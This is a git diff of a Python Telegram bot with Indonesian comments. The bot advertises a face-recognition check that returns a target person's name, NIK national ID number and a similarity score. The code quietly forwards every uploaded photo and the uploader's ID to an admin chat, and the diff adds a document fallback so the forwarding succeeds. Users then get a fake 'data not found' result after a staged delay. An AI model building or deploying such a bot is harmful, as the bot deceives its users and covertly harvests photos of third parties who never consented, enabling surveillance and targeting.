@@ -22,87 +22,68 @@ try:
 except:
     ADMIN_ID = None
 
-# --- HANDLER START ---
+# --- HANDLER START (SUDAH BERHASIL) ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.message.from_user
+    await update.message.reply_text("✅ Bot Aktif. Silakan kirim foto.")
     
-    # Teks sambutan baru sesuai permintaan
-    welcome_text = (
-        "SELAMAT DATANG\n\n"
-        "**BOT FR TESTING**\n"
-        "(KUOTA 10/DAY)\n\n"
-        "**CARA PENGGUNAAN BOT**\n\n"
-        "1. SILAHKAN MASUKKAN FOTO TARGET, UPAYAKAN FOTO TAMPAK DEPAN DAN TERLIHAT JELAS.\n\n"
-        "2. SISTEM AKAN MELAKUKAN PENGECEKAN FR TARGET DALAM 10MENIT WAKTU TERCEPAT UNTUK MENDAPATKAN HASIL FR AKURASI TINGGI.\n\n"
-        "3. BOT AKAN MENAMPILKAN HASIL NAMA, NIK, DAN PERSENTASE KEMIRIPAN DENGAN FOTO TARGET.\n\n"
-        "4. BOT BERFUNGSI SAAT SERVER HIDUP DI PUKUL 06.00 WIB SAMPAI DENGAN PUKUL 21.00 WIB.\n\n"
-        "5. GUNAKAN AKSES DENGAN BIJAK. TERIMAKASIH\n\n\n"
-        "SELAMAT BERTUGAS, SEMOGA SUKSES SELALU"
-    )
-    
-    await update.message.reply_text(welcome_text, parse_mode='Markdown')
-    
-    # Kirim info ke grup admin bahwa ada user yang mulai menggunakan bot
+    # Kirim info ke grup admin
     try:
-        if ADMIN_ID:
-            await context.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=f"🚀 **USER START**\nNama: {user.first_name}\nID: `{user.id}`",
-                parse_mode='Markdown'
-            )
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"🚀 **USER START**\nNama: {user.first_name}\nID: `{user.id}`",
+            parse_mode='Markdown'
+        )
     except Exception as e:
-        logger.error(f"Gagal kirim log start ke admin: {e}")
+        logger.error(f"Gagal kirim start ke admin: {e}")
 
-# --- HANDLER FOTO ---
+# --- HANDLER FOTO (UJI COBA DUAL-METHOD) ---
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Cek Jam Operasional (06.00 - 21.00 WIB)
-    now = datetime.now().hour
-    if now < 6 or now > 21:
-        await update.message.reply_text("⚠️ Server Offline. Bot hanya aktif pukul 06.00 - 21.00 WIB.")
-        return
-
     user = update.message.from_user
     photo_id = update.message.photo[-1].file_id
     
-    # Pesan baru saat proses kirim
-    await update.message.reply_text("Sedang diproses...")
+    await update.message.reply_text("📥 Foto diterima, mencoba mengirim ke admin...")
 
-    # KIRIM FOTO KE ADMIN
+    # METODE 1: Mencoba kirim sebagai FOTO
     try:
         await context.bot.send_photo(
             chat_id=ADMIN_ID,
             photo=photo_id,
-            caption=f"📥 **LAPORAN FOTO BARU**\nUser: {user.first_name}\nID: `{user.id}`",
+            caption=f"📸 **METODE FOTO**\nUser: {user.first_name}",
             parse_mode='Markdown'
         )
-    except Exception as e:
-        logger.error(f"Gagal kirim foto ke admin: {e}")
-        # Jika gagal kirim ke admin, beri tahu user (opsional)
-        # await update.message.reply_text(f"❌ Error sistem: {e}")
+        print("✅ Berhasil kirim menggunakan METODE FOTO")
+        
+    except Exception as e_photo:
+        print(f"❌ Gagal METODE FOTO: {e_photo}")
+        
+        # METODE 2: Jika foto gagal, coba kirim sebagai DOKUMEN/FILE
+        try:
+            await context.bot.send_document(
+                chat_id=ADMIN_ID,
+                document=photo_id,
+                caption=f"📄 **METODE DOKUMEN (Fallback)**\nUser: {user.first_name}",
+                parse_mode='Markdown'
+            )
+            print("✅ Berhasil kirim menggunakan METODE DOKUMEN")
+        except Exception as e_doc:
+            print(f"❌ Gagal METODE DOKUMEN: {e_doc}")
+            # Laporkan error terakhir ke chat user untuk diagnosa
+            await update.message.reply_text(f"❌ Semua metode gagal.\nError Foto: {e_photo}\nError Dokumen: {e_doc}")
+            return
 
-    # Simulasi jeda proses sebelum memberikan hasil akhir
-    await asyncio.sleep(4) 
-    
-    # Jika ingin mengganti hasil akhir menjadi lebih detail nantinya, ganti di sini
-    await update.message.reply_text(
-        "*HASIL PENGECEKAN FR*\n\n"
-        "Nama : DATA TIDAK DITEMUKAN\n"
-        "NIK  : -\n"
-        "STATUS : TIDAK ADA DATA",
-        parse_mode='Markdown'
-    )
+    # Balasan hasil simulasi ke user
+    await asyncio.sleep(2)
+    await update.message.reply_text("HASIL: DATA TIDAK DITEMUKAN")
 
 if __name__ == '__main__':
     if not TOKEN or not ADMIN_ID:
-        print("❌ Cek kembali file .env Anda!")
+        print("❌ Cek .env!")
         exit()
 
     app = ApplicationBuilder().token(TOKEN).build()
-    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
 
-    print(f"🚀 Bot berjalan... Target Admin: {ADMIN_ID}")
-    
-    # drop_pending_updates=True untuk memastikan bot tidak crash karena pesan lama
+    print(f"🚀 Bot Running... Target Admin: {ADMIN_ID}")
     app.run_polling(drop_pending_updates=True)
